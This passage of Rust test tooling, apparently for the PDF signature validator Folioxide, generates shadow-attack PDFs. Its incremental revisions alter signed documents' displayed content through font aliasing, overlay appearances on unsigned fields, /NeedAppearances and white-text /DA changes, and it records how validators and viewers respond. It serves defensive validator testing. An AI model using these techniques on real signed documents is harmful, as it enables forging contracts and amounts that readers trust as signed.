/// An unsigned document for [`shadow_markinfo_alias_page_parent`]: as
/// [`info_alias_page_parent_input`], with the page-tree node outside the `/Kids` tree (which
/// also has `/Marked true`) registered as the catalog's `/MarkInfo` instead of the `/Info`.
pub fn markinfo_alias_page_parent_input(pdf: &[u8]) -> Option<Vec<u8>> {
    page_parent_alias_input(pdf, AliasRole::MarkInfo)
}

/// Points `/Resources /Font /F1` of the dictionary `alias` at the planted Courier font.
fn replace_inherited_font(store: &mut Store, alias: ObjectId) -> Option<()> {
    let courier = store.object_ids().into_iter().find(|&id| {
        store.resolve(id).ok().is_some_and(|obj| {
            obj.as_dict().is_some_and(|d| {
                d.is_type(b"Font") && d.get_name(b"BaseFont").is_some_and(|n| n == b"Courier")
            })
        })
    })?;
    let mut dict = store.resolve(alias).ok()?.as_dict()?.clone();
    let mut resources = dict.get_dict(b"Resources")?.clone();
    let mut fonts = resources.get_dict(b"Font")?.clone();
    fonts.insert("F1", Object::Ref(courier));
    resources.insert("Font", Object::Dict(fonts));
    dict.insert("Resources", Object::Dict(resources));
    store.set(alias, Object::Dict(dict)).ok()
}

/// `shadow_info_alias_page_parent`: on a document signed with its `/Info` aliased to the page's
/// `/Parent` ([`info_alias_page_parent_input`]), a revision that changes the `/Info` dictionary's
/// inherited `/Resources` so the page's `/F1` is the planted Courier font (expert atk_parent: a
/// "document-information update" that replaces the rendered text in pdf.js, MuPDF and pdfium).
/// Folioxide: `OTHER`; pyHanko: `LTA_UPDATES` (it skips `/Parent` in its usage paths).
pub fn shadow_info_alias_page_parent(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let info = store.trailer().get_ref(keys::INFO)?;
        replace_inherited_font(store, info)
    })
}

/// `shadow_markinfo_alias_page_parent`: the same through the catalog's `/MarkInfo`
/// ([`markinfo_alias_page_parent_input`]; expert atk_mi_parent). Folioxide: `OTHER`; pyHanko:
/// `LTA_UPDATES`.
pub fn shadow_markinfo_alias_page_parent(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let root = store.root_id()?;
        let mark_info = store.resolve(root).ok()?.as_dict()?.get_ref(b"MarkInfo")?;
        replace_inherited_font(store, mark_info)
    })
}

// =================================================================================================
// Shadow: unsigned signature fields that exist when the document is signed (QA finding: a field
// that stays unsigned may not gain an appearance).
// =================================================================================================

/// The text the existing appearance of the `Witness` field shows.
const SIGN_HERE: &[u8] = b"0 g BT /Helv 12 Tf 4 20 Td (Sign here) Tj ET";

/// An unsigned document for the unsigned-signature-field cases: `pdf` (`minimal`-like, with no
/// AcroForm) with a revision that adds a new AcroForm (`/Fields`, `/DR << /Font << /Helv font >>
/// >>`, `/DA`) and three **visible, unsigned** signature fields on the first page, each at the
/// root of `/Fields` and on the page's `/Annots`:
/// - `CoSigner`: a merged field and widget, `/Rect [60 600 420 660]`, no `/AP`;
/// - `Witness`: a merged field and widget, `/Rect [60 500 420 560]`, with an appearance stream
///   that shows "Sign here";
/// - `Approver`: a field (`/FT /Sig /T (Approver)`) whose widget is its kid (`/Kids [w]`, the
///   widget with `/Parent`, `/Rect [60 400 420 460]`).
pub fn unsigned_sig_fields_input(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let page = first_page(store)?;
        let font = first_object_of_type(store, b"Font")?;
        let widget = |name: Option<&str>, rect_values: [i64; 4]| {
            let mut dict = Dict::new();
            dict.insert("Type", Object::name("Annot"));
            dict.insert("Subtype", Object::name("Widget"));
            if let Some(name) = name {
                dict.insert("FT", Object::name("Sig"));
                dict.insert("T", Object::literal_string(name));
            }
            dict.insert("F", Object::Int(4));
            dict.insert("Rect", rect(rect_values));
            dict.insert("P", Object::Ref(page));
            dict
        };
        let co_signer = store
            .add(Object::Dict(widget(Some("CoSigner"), [60, 600, 420, 660])))
            .ok()?;

        let mut form = Dict::new();
        form.insert("Type", Object::name("XObject"));
        form.insert("Subtype", Object::name("Form"));
        form.insert("BBox", rect([0, 0, 360, 60]));
        let mut font_dict = Dict::new();
        font_dict.insert("Helv", Object::Ref(font));
        let mut resources = Dict::new();
        resources.insert("Font", Object::Dict(font_dict.clone()));
        form.insert("Resources", Object::Dict(resources));
        let stream = folioxide_syntax::Stream::new(form, StreamData::Decoded(SIGN_HERE.to_vec()));
        let sign_here = store.add(Object::Stream(Box::new(stream))).ok()?;
        let mut witness = widget(Some("Witness"), [60, 500, 420, 560]);
        witness.insert("AP", normal_appearance(sign_here));
        let witness = store.add(Object::Dict(witness)).ok()?;

        let mut approver = Dict::new();
        approver.insert("FT", Object::name("Sig"));
        approver.insert("T", Object::literal_string("Approver"));
        let approver = store.add(Object::Dict(approver)).ok()?;
        let mut kid = widget(None, [60, 400, 420, 460]);
        kid.insert("Parent", Object::Ref(approver));
        let kid = store.add(Object::Dict(kid)).ok()?;
        let mut approver_dict = store.resolve(approver).ok()?.as_dict()?.clone();
        approver_dict.insert("Kids", Object::Array(vec![Object::Ref(kid)]));
        store.set(approver, Object::Dict(approver_dict)).ok()?;

        for annotation in [co_signer, witness, kid] {
            append_to_array_entry(store, page, b"Annots", annotation)?;
        }
        let mut dr = Dict::new();
        dr.insert("Font", Object::Dict(font_dict));
        let mut acroform = Dict::new();
        acroform.insert(
            "Fields",
            Object::Array(vec![
                Object::Ref(co_signer),
                Object::Ref(witness),
                Object::Ref(approver),
            ]),
        );
        acroform.insert("DR", Object::Dict(dr));
        acroform.insert("DA", Object::literal_string("/Helv 0 Tf 0 g"));
        let acroform = store.add(Object::Dict(acroform)).ok()?;
        let root = store.root_id()?;
        let mut catalog = store.resolve(root).ok()?.as_dict()?.clone();
        catalog.insert("AcroForm", Object::Ref(acroform));
        store.set(root, Object::Dict(catalog)).ok()
    })
}

/// The object of the field whose `/T` is `name`.
fn field_named(store: &Store, name: &[u8]) -> Option<ObjectId> {
    store.object_ids().into_iter().find(|&id| {
        store
            .resolve(id)
            .ok()
            .is_some_and(|obj| obj.as_dict().and_then(|d| d.get_str_bytes(b"T")) == Some(name))
    })
}

/// A well-formed revision that lets `edit` change the dictionary of the field named `name`.
fn edit_field(
    pdf: &[u8],
    name: &[u8],
    edit: impl FnOnce(&mut Store, &mut Dict),
) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let id = field_named(store, name)?;
        let mut dict = store.resolve(id).ok()?.as_dict()?.clone();
        edit(store, &mut dict);
        store.set(id, Object::Dict(dict)).ok()
    })
}

/// A new full-page overlay appearance ([`add_overlay_appearance`] on the first page).
fn new_overlay(store: &mut Store) -> Option<ObjectId> {
    let page = first_page(store)?;
    add_overlay_appearance(store, page)
}

/// `shadow_unsigned_field_ap_added`: on a document signed with the unsigned field `CoSigner`
/// ([`unsigned_sig_fields_input`]), a revision that gives the field a new appearance stream that
/// paints over the page, without signing it (QA poc1). pyHanko and Folioxide: `OTHER`.
pub fn shadow_unsigned_field_ap_added(pdf: &[u8]) -> Option<Vec<u8>> {
    let mut appearance = None;
    let out = edit_field(pdf, b"CoSigner", |store, dict| {
        appearance = new_overlay(store);
        if let Some(ap) = appearance {
            dict.insert("AP", normal_appearance(ap));
        }
    })?;
    appearance.map(|_| out)
}

/// `shadow_unsigned_field_ap_repointed`: the unsigned field `Witness`'s `/AP /N` re-pointed from
/// its "Sign here" stream to a new overlay stream, without signing. pyHanko and Folioxide:
/// `OTHER`.
pub fn shadow_unsigned_field_ap_repointed(pdf: &[u8]) -> Option<Vec<u8>> {
    let mut appearance = None;
    let out = edit_field(pdf, b"Witness", |store, dict| {
        appearance = new_overlay(store);
        if let Some(ap) = appearance {
            dict.insert("AP", normal_appearance(ap));
        }
    })?;
    appearance.map(|_| out)
}

/// `shadow_unsigned_field_hidden`: the unsigned field `Witness` hidden (`/F 2`, §12.5.3), without
/// signing. pyHanko and Folioxide: `OTHER`.
pub fn shadow_unsigned_field_hidden(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_field(pdf, b"Witness", |_, dict| {
        dict.insert("F", Object::Int(2));
    })
}

/// `shadow_unsigned_field_as_added`: the unsigned field `CoSigner` gains an appearance state
/// `/AS /Off`, without signing. pyHanko and Folioxide: `OTHER`.
pub fn shadow_unsigned_field_as_added(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_field(pdf, b"CoSigner", |_, dict| {
        dict.insert("AS", Object::name("Off"));
    })
}

/// `shadow_unsigned_field_parent_ap`: the unsigned field `Approver` (whose widget is its kid)
/// gains an overlay `/AP` on the field dictionary, without signing. pyHanko and Folioxide:
/// `OTHER`.
pub fn shadow_unsigned_field_parent_ap(pdf: &[u8]) -> Option<Vec<u8>> {
    let mut appearance = None;
    let out = edit_field(pdf, b"Approver", |store, dict| {
        appearance = new_overlay(store);
        if let Some(ap) = appearance {
            dict.insert("AP", normal_appearance(ap));
        }
    })?;
    appearance.map(|_| out)
}

/// `unsigned_field_flags_only`: the control case, the unsigned field `CoSigner`'s field flags
/// set (`/Ff 1`, ReadOnly): pyHanko's always-modifiable key (`LTA_UPDATES` in both).
pub fn unsigned_field_flags_only(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_field(pdf, b"CoSigner", |_, dict| {
        dict.insert("Ff", Object::Int(1));
    })
}

/// `acroform_dr_removed`: a revision that removes the AcroForm's `/DR` (on a document with one,
/// such as [`unsigned_sig_fields_input`]). pyHanko ("Key /DR was deleted") and Folioxide:
/// `OTHER`.
pub fn acroform_dr_removed(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_acroform(pdf, |_, dict| dict.remove(b"DR".as_slice()).map(|_| ()))
}

/// A well-formed revision that lets `edit` change the dictionary of the document's indirect
/// AcroForm (`edit` returns `None` to abort). `None` without an indirect AcroForm.
fn edit_acroform(
    pdf: &[u8],
    edit: impl FnOnce(&mut Store, &mut Dict) -> Option<()>,
) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let root = store.root_id()?;
        let acroform = store.resolve(root).ok()?.as_dict()?.get_ref(b"AcroForm")?;
        let mut dict = store.resolve(acroform).ok()?.as_dict()?.clone();
        edit(store, &mut dict)?;
        store.set(acroform, Object::Dict(dict)).ok()
    })
}

// =================================================================================================
// Shadow: the AcroForm's appearance controls (expert finding, round 3). A later revision that
// sets /NeedAppearances, changes /DA or re-points a /DR resource name makes viewers regenerate
// the signed fields' appearances differently.
// =================================================================================================

/// The appearance the `Amount` field of [`text_field_form_input`] shows when signed.
const AMOUNT_APPEARANCE: &[u8] = b"/Tx BMC q BT /Helv 20 Tf 0 g 2 8 Td (100 EUR) Tj ET Q EMC";

/// The appearance of the registered `Other` field of [`orphan_text_widget_input`].
const OTHER_APPEARANCE: &[u8] = b"/Tx BMC q BT /Helv 20 Tf 0 g 2 8 Td (x) Tj ET Q EMC";

/// The appearance of the registered `Other` field of [`orphan_widget_bare_appearance_input`],
/// which has no `/Resources` of its own.
const BARE_OTHER_APPEARANCE: &[u8] = b"/Tx BMC q /GS9 gs BT /F9 20 Tf 0 g 2 8 Td (x) Tj ET Q EMC";

/// The appearance [`text_field_form`] gives the `Amount` field.
#[derive(Clone, Copy, PartialEq, Eq)]
enum AmountAppearance {
    /// `/AP << /N stream >>`, the stream showing "100 EUR".
    Stream,
    /// `/AP << /N dict >>`, `dict` an indirect dictionary that is no stream (expert probe
    /// `b_n_plaindict`): no appearance stream, though `/AP /N` is present.
    NotStream,
    /// No `/AP`.
    None,
}

/// What [`text_field_form`] puts in the text-field document.
#[derive(Clone, Copy)]
struct TextFieldForm {
    /// The `Amount` field's appearance.
    appearance: AmountAppearance,
    /// The `Amount` field's own `/DA`, if any.
    field_da: Option<&'static str>,
    /// `Amount` is an orphan widget: on the page, but not in `/Fields`, which holds a second
    /// text field `Other` (with an appearance stream) instead (expert probe `b_orphan`).
    orphan: bool,
    /// The appearance stream of `Other` (with `orphan`) has no `/Resources` of its own and
    /// names `/GS9` and `/F9` ([`BARE_OTHER_APPEARANCE`]).
    bare_other: bool,
    /// The AcroForm has `/DA (/Helv 20 Tf 0 g)`.
    acroform_da: bool,
    /// The AcroForm's `/DR /Font` has `/Helv` (else it is empty).
    dr_helv: bool,
    /// The AcroForm has `/NeedAppearances true`.
    need_appearances: bool,
}

impl TextFieldForm {
    /// The document of [`text_field_form_input`].
    const DEFAULT: TextFieldForm = TextFieldForm {
        appearance: AmountAppearance::Stream,
        field_da: None,
        orphan: false,
        bare_other: false,
        acroform_da: true,
        dr_helv: true,
        need_appearances: false,
    };
}

/// An unsigned document for the AcroForm-control cases: `pdf` (`minimal`-like, with no
/// AcroForm) with a revision that adds a text field `Amount`, merged with its widget on the
/// first page (`/Rect [72 650 272 680]`, no `/DA` of its own), whose appearance stream shows
/// "100 EUR" while its value `/V` is "900 EUR", and an indirect AcroForm with `/Fields
/// [Amount]`, `/DA (/Helv 20 Tf 0 g)` and `/DR << /Font << /Helv font >> >>` (the first font of
/// `pdf`), without `/NeedAppearances` or `/Q`. A viewer that regenerates the field's appearance
/// draws "900 EUR" instead of the signed "100 EUR" (expert finding, poppler and MuPDF).
pub fn text_field_form_input(pdf: &[u8]) -> Option<Vec<u8>> {
    text_field_form(pdf, TextFieldForm::DEFAULT)
}

/// [`text_field_form_input`] with `/NeedAppearances true` in the AcroForm: viewers show the
/// field as they construct it from its `/V`, "900 EUR", not its stored "100 EUR" appearance
/// (expert probe `b_na_stale`).
pub fn text_field_need_appearances_input(pdf: &[u8]) -> Option<Vec<u8>> {
    text_field_form(
        pdf,
        TextFieldForm {
            need_appearances: true,
            ..TextFieldForm::DEFAULT
        },
    )
}

/// [`text_field_form_input`] without the field's appearance stream and without the AcroForm's
/// `/DA`: the field has neither an appearance nor a default appearance of its own, so viewers
/// draw it with whatever the AcroForm's `/DA` says (expert probe `b_noap_noda`).
pub fn text_field_no_appearance_input(pdf: &[u8]) -> Option<Vec<u8>> {
    text_field_form(
        pdf,
        TextFieldForm {
            appearance: AmountAppearance::None,
            acroform_da: false,
            ..TextFieldForm::DEFAULT
        },
    )
}

/// [`text_field_no_appearance_input`] with an `/AP` whose `/N` is an indirect dictionary that is
/// no stream (expert probe `b_n_plaindict`): no appearance stream to draw, so viewers draw the
/// field with whatever the AcroForm's `/DA` says (MuPDF: 138 dark pixels before a white `/DA`
/// is added, 0 after).
pub fn text_field_ap_not_stream_input(pdf: &[u8]) -> Option<Vec<u8>> {
    text_field_form(
        pdf,
        TextFieldForm {
            appearance: AmountAppearance::NotStream,
            acroform_da: false,
            ..TextFieldForm::DEFAULT
        },
    )
}

/// [`text_field_no_appearance_input`] with `Amount` an orphan widget: on the page, but not in
/// `/Fields`, which holds a second text field `Other` with an appearance stream instead (expert
/// probe `b_orphan`). Viewers still draw `Amount`, with the AcroForm's `/DA`.
pub fn orphan_text_widget_input(pdf: &[u8]) -> Option<Vec<u8>> {
    text_field_form(
        pdf,
        TextFieldForm {
            appearance: AmountAppearance::None,
            orphan: true,
            acroform_da: false,
            ..TextFieldForm::DEFAULT
        },
    )
}

/// [`orphan_text_widget_input`] with the orphan widget's own `/DA (/F7 20 Tf 0 g)`, a font name
/// the AcroForm's `/DR` lacks when the document is signed (expert probe `b_orphan_f7`).
pub fn orphan_text_widget_da_font_input(pdf: &[u8]) -> Option<Vec<u8>> {
    text_field_form(
        pdf,
        TextFieldForm {
            appearance: AmountAppearance::None,
            field_da: Some("/F7 20 Tf 0 g"),
            orphan: true,
            acroform_da: false,
            ..TextFieldForm::DEFAULT
        },
    )
}

/// [`orphan_text_widget_da_font_input`] whose registered `Other` field's appearance stream has
/// no `/Resources` of its own and names `/GS9` and `/F9`, which some viewers then resolve in the
/// AcroForm's `/DR` (it has neither).
pub fn orphan_widget_bare_appearance_input(pdf: &[u8]) -> Option<Vec<u8>> {
    text_field_form(
        pdf,
        TextFieldForm {
            appearance: AmountAppearance::None,
            field_da: Some("/F7 20 Tf 0 g"),
            orphan: true,
            bare_other: true,
            acroform_da: false,
            ..TextFieldForm::DEFAULT
        },
    )
}

/// [`text_field_form_input`] with an empty `/DR /Font`: the AcroForm's `/DA` selects `/Helv`,
/// which does not resolve when the document is signed.
pub fn text_field_da_font_missing_input(pdf: &[u8]) -> Option<Vec<u8>> {
    text_field_form(
        pdf,
        TextFieldForm {
            dr_helv: false,
            ..TextFieldForm::DEFAULT
        },
    )
}

/// The text-field document of [`text_field_form_input`] and its variants.
fn text_field_form(pdf: &[u8], options: TextFieldForm) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let page = first_page(store)?;
        let font = first_object_of_type(store, b"Font")?;
        let mut fonts = Dict::new();
        fonts.insert("Helv", Object::Ref(font));

        // A text field merged with its widget on the first page.
        let text_widget = |name: &str, value: &str, rect_values: [i64; 4]| {
            let mut dict = Dict::new();
            dict.insert("Type", Object::name("Annot"));
            dict.insert("Subtype", Object::name("Widget"));
            dict.insert("FT", Object::name("Tx"));
            dict.insert("T", Object::literal_string(name));
            dict.insert("V", Object::literal_string(value));
            dict.insert("F", Object::Int(4));
            dict.insert("Rect", rect(rect_values));
            dict.insert("P", Object::Ref(page));
            dict
        };
        // A form XObject that shows `content`, with the /Helv font in resources of its own
        // when `resources`.
        let add_appearance = |store: &mut Store, content: &[u8], resources: bool| {
            let mut form = Dict::new();
            form.insert("Type", Object::name("XObject"));
            form.insert("Subtype", Object::name("Form"));
            form.insert("BBox", rect([0, 0, 200, 30]));
            if resources {
                let mut resources = Dict::new();
                resources.insert("Font", Object::Dict(fonts.clone()));
                form.insert("Resources", Object::Dict(resources));
            }
            let stream = folioxide_syntax::Stream::new(form, StreamData::Decoded(content.to_vec()));
            store.add(Object::Stream(Box::new(stream))).ok()
        };

        let mut amount = text_widget("Amount", "900 EUR", [72, 650, 272, 680]);
        match options.appearance {
            AmountAppearance::Stream => {
                let appearance = add_appearance(store, AMOUNT_APPEARANCE, true)?;
                amount.insert("AP", normal_appearance(appearance));
            }
            AmountAppearance::NotStream => {
                let mut plain = Dict::new();
                plain.insert("Foo", Object::Int(1));
                let plain = store.add(Object::Dict(plain)).ok()?;
                amount.insert("AP", normal_appearance(plain));
            }
            AmountAppearance::None => {}
        }
        if let Some(da) = options.field_da {
            amount.insert("DA", Object::literal_string(da));
        }
        let amount = store.add(Object::Dict(amount)).ok()?;
        append_to_array_entry(store, page, b"Annots", amount)?;
        let registered = if options.orphan {
            let mut other = text_widget("Other", "x", [72, 500, 272, 530]);
            let appearance = if options.bare_other {
                add_appearance(store, BARE_OTHER_APPEARANCE, false)?
            } else {
                add_appearance(store, OTHER_APPEARANCE, true)?
            };
            other.insert("AP", normal_appearance(appearance));
            let other = store.add(Object::Dict(other)).ok()?;
            append_to_array_entry(store, page, b"Annots", other)?;
            other
        } else {
            amount
        };

        let mut dr = Dict::new();
        dr.insert(
            "Font",
            Object::Dict(if options.dr_helv { fonts } else { Dict::new() }),
        );
        let mut acroform = Dict::new();
        acroform.insert("Fields", Object::Array(vec![Object::Ref(registered)]));
        if options.acroform_da {
            acroform.insert("DA", Object::literal_string("/Helv 20 Tf 0 g"));
        }
        acroform.insert("DR", Object::Dict(dr));
        if options.need_appearances {
            acroform.insert("NeedAppearances", Object::Bool(true));
        }
        let acroform = store.add(Object::Dict(acroform)).ok()?;
        let root = store.root_id()?;
        let mut catalog = store.resolve(root).ok()?.as_dict()?.clone();
        catalog.insert("AcroForm", Object::Ref(acroform));
        store.set(root, Object::Dict(catalog)).ok()
    })
}

/// `shadow_acroform_need_appearances_set`: on a document signed with the `Amount` field
/// ([`text_field_form_input`]), a revision that sets the AcroForm's `/NeedAppearances true`
/// (§12.7.3): viewers regenerate the field's appearance from its `/V` and show "900 EUR".
/// Folioxide: `OTHER`; pyHanko: `LTA_UPDATES` (an exempt AcroForm key).
pub fn shadow_acroform_need_appearances_set(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_acroform(pdf, |_, dict| {
        dict.insert("NeedAppearances", Object::Bool(true));
        Some(())
    })
}

/// `shadow_acroform_need_appearances_removed_stale_ap`: on a document signed with
/// `/NeedAppearances true` ([`text_field_need_appearances_input`]), where viewers showed the
/// `Amount` field as constructed from its `/V` ("900 EUR"), a revision that removes the key:
/// viewers now show the stale stored appearance, "100 EUR" (expert finding, the shadow
/// Hide-and-Reveal; poppler shows "900 EUR" signed and "100 EUR" after the update). Folioxide:
/// `OTHER`; pyHanko: `LTA_UPDATES` (an exempt AcroForm key).
pub fn shadow_acroform_need_appearances_removed_stale_ap(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_acroform(pdf, |_, dict| {
        match dict.remove(b"NeedAppearances".as_slice())? {
            Object::Bool(true) => Some(()),
            _ => None,
        }
    })
}

/// `acroform_need_appearances_false_added`: `/NeedAppearances false` added to an AcroForm
/// without it (such as [`text_field_form_input`]'s). It changes nothing a viewer does (absent
/// means `false`), but the whitelist refuses any change to the key. Folioxide: `OTHER`;
/// pyHanko: `LTA_UPDATES`.
pub fn acroform_need_appearances_false_added(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_acroform(pdf, |_, dict| {
        if dict.contains_key(b"NeedAppearances") {
            return None;
        }
        dict.insert("NeedAppearances", Object::Bool(false));
        Some(())
    })
}

/// `shadow_acroform_da_changed`: the AcroForm's existing `/DA` changed to white text (`/Helv 20
/// Tf 1 g`): a viewer that regenerates the appearance of a field without its own `/DA` draws it
/// invisible. Folioxide: `OTHER`; pyHanko: `LTA_UPDATES`.
pub fn shadow_acroform_da_changed(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_acroform(pdf, |_, dict| {
        dict.get(b"DA")?;
        dict.insert("DA", Object::literal_string("/Helv 20 Tf 1 g"));
        Some(())
    })
}

/// `shadow_acroform_da_removed`: the AcroForm's `/DA` removed: a viewer that regenerates the
/// appearance of a field without its own `/DA` falls back to its own default. Folioxide:
/// `OTHER`; pyHanko: `LTA_UPDATES`.
pub fn shadow_acroform_da_removed(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_acroform(pdf, |_, dict| dict.remove(b"DA".as_slice()).map(|_| ()))
}

/// `shadow_acroform_da_added_noap`: on a document signed with a text field that has neither an
/// appearance stream nor a `/DA` of its own, in an AcroForm without `/DA`
/// ([`text_field_no_appearance_input`]), a revision that adds the AcroForm `/DA (/Helv 20 Tf 1
/// g)`: viewers now draw the field's value in white (expert finding: MuPDF 138 dark pixels
/// before, 0 after). Folioxide: `OTHER`; pyHanko: `LTA_UPDATES`.
pub fn shadow_acroform_da_added_noap(pdf: &[u8]) -> Option<Vec<u8>> {
    add_white_acroform_da(pdf)
}

/// `shadow_acroform_da_added_ap_not_stream`: on a document signed with a text field whose
/// `/AP /N` is an indirect dictionary that is no stream, without a `/DA` of its own, in an
/// AcroForm without `/DA` ([`text_field_ap_not_stream_input`]), a revision that adds the
/// AcroForm `/DA (/Helv 20 Tf 1 g)`: viewers have no appearance stream to draw and now draw the
/// field's value in white (expert finding, round 5: an `/AP /N` that is present was taken for an
/// appearance stream). Folioxide: `OTHER`; pyHanko: `LTA_UPDATES` (it raises
/// `IndirectObjectExpected` when `/N` is a direct dictionary or an integer instead).
pub fn shadow_acroform_da_added_ap_not_stream(pdf: &[u8]) -> Option<Vec<u8>> {
    add_white_acroform_da(pdf)
}

/// `shadow_acroform_da_added_orphan_widget`: on a document signed with a text widget on the
/// page that `/Fields` does not list, without an appearance stream or a `/DA` of its own
/// ([`orphan_text_widget_input`]), a revision that adds the AcroForm `/DA (/Helv 20 Tf 1 g)`:
/// viewers still draw the orphan widget, now in white (expert finding, round 5: only the field
/// tree was checked). Folioxide: `OTHER`; pyHanko: `LTA_UPDATES`.
pub fn shadow_acroform_da_added_orphan_widget(pdf: &[u8]) -> Option<Vec<u8>> {
    add_white_acroform_da(pdf)
}

/// A revision that adds the AcroForm `/DA (/Helv 20 Tf 1 g)` (white text) to an AcroForm
/// without one.
fn add_white_acroform_da(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_acroform(pdf, |_, dict| {
        if dict.contains_key(b"DA") {
            return None;
        }
        dict.insert("DA", Object::literal_string("/Helv 20 Tf 1 g"));
        Some(())
    })
}

/// `shadow_acroform_q_changed`: the AcroForm's `/Q` (the default quadding of the fields
/// without their own, §12.7.4.3) set to 2 (right-aligned; 0 when it already is 2): regenerated
/// appearances move. Folioxide: `OTHER`; pyHanko: `LTA_UPDATES`.
pub fn shadow_acroform_q_changed(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_acroform(pdf, |_, dict| {
        let q = match dict.get(b"Q") {
            Some(Object::Int(2)) => 0,
            _ => 2,
        };
        dict.insert("Q", Object::Int(q));
        Some(())
    })
}

/// `form_field_value_changed`: on a document signed with the `Amount` text field
/// ([`text_field_form_input`]), a revision that changes only the field's value `/V` to "1 EUR":
/// generic form filling, which M3 does not classify (DECISIONS D10 D-9: Folioxide `OTHER` until
/// M4 WP4.2); pyHanko: `FORM_FILLING`.
pub fn form_field_value_changed(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_field(pdf, b"Amount", |_, dict| {
        dict.insert("V", Object::literal_string("1 EUR"));
    })
}

/// `dss_added`: a revision that adds a document security store to the catalog (`/DSS <<
/// /Type /DSS /Certs [stream] >>`, ETSI EN 319 142-1 §5.4.2.2; ISO 32000-2 §12.8.4.3), holding
/// the first certificate of the signature's CMS, as a long-term validation update would. M3
/// does not classify the DSS (DECISIONS D10 D-9: Folioxide `OTHER` until M11); pyHanko:
/// `LTA_UPDATES`. `None` without a signature or when the catalog has a `/DSS` already.
pub fn dss_added(pdf: &[u8]) -> Option<Vec<u8>> {
    let certificate = first_cms_certificate(pdf)?;
    with_incremental(pdf, |store| {
        let root = store.root_id()?;
        let mut catalog = store.resolve(root).ok()?.as_dict()?.clone();
        if catalog.contains_key(b"DSS") {
            return None;
        }
        let stream = folioxide_syntax::Stream::new(Dict::new(), StreamData::Decoded(certificate));
        let certificate = store.add(Object::Stream(Box::new(stream))).ok()?;
        let mut dss = Dict::new();
        dss.insert("Type", Object::name("DSS"));
        dss.insert("Certs", Object::Array(vec![Object::Ref(certificate)]));
        let dss = store.add(Object::Dict(dss)).ok()?;
        catalog.insert("DSS", Object::Ref(dss));
        store.set(root, Object::Dict(catalog)).ok()
    })
}

/// The DER of the first certificate in the `certificates` field (`[0] IMPLICIT`, RFC 5652
/// §5.1) of the signature's CMS. `None` without a signature or such a certificate.
fn first_cms_certificate(pdf: &[u8]) -> Option<Vec<u8>> {
    let span = contents_value_span(pdf)?;
    let hex = pdf.get(span.start.checked_add(1)?..span.end.checked_sub(1)?)?;
    let der = decode_hex(hex)?;
    let (_, content_info) = single_element(trim_to_der(&der))?;
    let content_info = der_elements(content_info)?;
    let [_, (_, explicit)] = content_info.as_slice() else {
        return None;
    };
    let (_, signed_data) = single_element(explicit)?;
    let (_, certificates) = der_elements(signed_data)?
        .into_iter()
        .find(|(tag, _)| *tag == TAG_CONTEXT_0)?;
    let (tag, certificate) = der_elements(certificates)?.into_iter().next()?;
    Some(der_encode(tag, certificate))
}

/// A new Courier font dictionary (§9.6.2.2, a standard 14 font).
fn add_courier(store: &mut Store) -> Option<ObjectId> {
    let mut font = Dict::new();
    font.insert("Type", Object::name("Font"));
    font.insert("Subtype", Object::name("Type1"));
    font.insert("BaseFont", Object::name("Courier"));
    store.add(Object::Dict(font)).ok()
}

/// A revision that lets `edit` change the direct `/Font` dictionary of the AcroForm's direct
/// `/DR`, with a new Courier font for it to use.
fn edit_dr_fonts(
    pdf: &[u8],
    edit: impl FnOnce(&mut Dict, ObjectId) -> Option<()>,
) -> Option<Vec<u8>> {
    edit_acroform(pdf, |store, dict| {
        let courier = add_courier(store)?;
        let mut dr = dict.get_dict(b"DR")?.clone();
        let mut fonts = dr.get_dict(b"Font")?.clone();
        edit(&mut fonts, courier)?;
        dr.insert("Font", Object::Dict(fonts));
        dict.insert("DR", Object::Dict(dr));
        Some(())
    })
}

/// `shadow_acroform_dr_name_replaced`: the AcroForm's `/DR /Font /Helv` (the font the `/DA`
/// selects) re-pointed to a new Courier font: regenerated appearances use another font.
/// Folioxide: `OTHER`; pyHanko: `FORM_FILLING` (it clears what a new `/DR` holds).
pub fn shadow_acroform_dr_name_replaced(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_dr_fonts(pdf, |fonts, courier| {
        fonts.get(b"Helv")?;
        fonts.insert("Helv", Object::Ref(courier));
        Some(())
    })
}

/// `shadow_acroform_dr_name_removed`: the AcroForm's direct `/DR /Font /Helv` (the font the
/// `/DA` selects) removed: regenerated appearances fall back to another font. Folioxide:
/// `OTHER`; pyHanko: `LTA_UPDATES` (no new object; it exempts `/DR` from its comparison).
pub fn shadow_acroform_dr_name_removed(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_acroform(pdf, |_, dict| {
        let mut dr = dict.get_dict(b"DR")?.clone();
        let mut fonts = dr.get_dict(b"Font")?.clone();
        fonts.remove(b"Helv".as_slice())?;
        dr.insert("Font", Object::Dict(fonts));
        dict.insert("DR", Object::Dict(dr));
        Some(())
    })
}

/// `shadow_acroform_dr_da_font_added`: on a document signed with an AcroForm `/DA` that
/// selects `/Helv` while `/DR /Font` has no `/Helv` ([`text_field_da_font_missing_input`]), a
/// revision that adds `/DR /Font /Helv` (a new Courier font): the name the signed `/DA` selects
/// now resolves, so regenerated appearances change font. Folioxide: `OTHER`; pyHanko:
/// `FORM_FILLING` (it clears what a new `/DR` holds).
pub fn shadow_acroform_dr_da_font_added(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_dr_fonts(pdf, |fonts, courier| {
        if fonts.contains_key(b"Helv") {
            return None;
        }
        fonts.insert("Helv", Object::Ref(courier));
        Some(())
    })
}

/// `shadow_acroform_dr_font_orphan_widget_da`: on a document signed with an orphan text widget
/// (on the page, not in `/Fields`) whose own `/DA` selects `/F7`, a name the AcroForm's `/DR`
